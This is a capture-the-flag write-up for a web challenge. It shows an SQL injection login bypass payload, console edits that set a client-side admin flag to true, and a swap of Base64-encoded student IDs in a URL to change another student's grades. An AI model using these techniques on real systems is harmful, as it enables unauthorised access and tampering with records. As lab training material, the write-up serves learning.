 OSU CTF - Web Challenge (Moderate)

 Initial Steps
I started by attempting an SQL injection on the login page using the following payload:
```sql
Admin' or 1=1--
```
This allowed me to bypass authentication and gain access to the dashboard.

 Inspecting JavaScript Files
Next, I inspected the JavaScript files in the application by opening the browser’s Developer Tools. I looked for unlinked routes and hidden functionalities within the code.

One particular JavaScript file, `/assets/js/app.min.js`, caught my attention. It contained the following script:
```javascript
(function (s, objectName) {
  setupLinks = function () {
    if (s.admin) {
      var sl = document.getElementsByClassName('student-link');
      for (i = 0; i < sl.length; i++) {
        let name = sl[i].innerHTML;
        sl[i].style.cursor = 'pointer';
        sl[i].addEventListener('click', function () {
          window.location = '/update-' + objectName + '/' + this.dataset.id;
        });
      }
    }
  };
  updateForm = function () {
    var submitButton = document.getElementsByClassName('update-record');
    if (submitButton.length === 1) {
      submitButton[0].addEventListener('click', function () {
        var english = document.getElementById('english');
        english = english.options[english.selectedIndex].value;
        var science = document.getElementById('science');
        science = science.options[science.selectedIndex].value;
        var maths = document.getElementById('maths');
        maths = maths.options[maths.selectedIndex].value;
        var grades = new Set(['A', 'B', 'C', 'D', 'E', 'F']);
        if (grades.has(english) && grades.has(science) && grades.has(maths)) {
          document.getElementById('student-form').submit();
        } else {
          alert('Grades should only be between A - F');
        }
      });
    }
  };
  setupLinks();
  updateForm();
}) (staff, 'student');
```

 Exploiting the `s.admin` Variable
I noticed the variable `s.admin`, which seemed to control access to certain functionalities. By checking its value in the console:
```javascript
console.log(s.admin);
```
I found that it returned `false`. I then manually set it to `true`:
```javascript
console.log(window.staff.admin);
staff.admin = true;
setupLinks();
```
Now, I was able to click on student names.

 Finding the Encoded String
Clicking on a student’s name (e.g., ‘Brett, Nancie’) redirected me to:
```
/update-student/TmFuY2llX0JyZXR0
```
The random string at the end looked suspicious. I used [hashes.com](https://hashes.com/en/tools/hash_identifier) to identify it and found that it was Base64 encoded. Decoding it revealed:
```
Nancie_Brett
```

 Modifying the Request
I replaced `Nancie_Brett` with `Natasha_Drew`, encoded it in Base64, and updated the URL to:
```
/update-student/TmF0YXNoYV9EcmV3
```
I then changed all scores to ‘A’ and clicked on `Update Record`.

 Capturing the Flag
After updating the record, the flag popped up, marking the successful completion of the challenge!

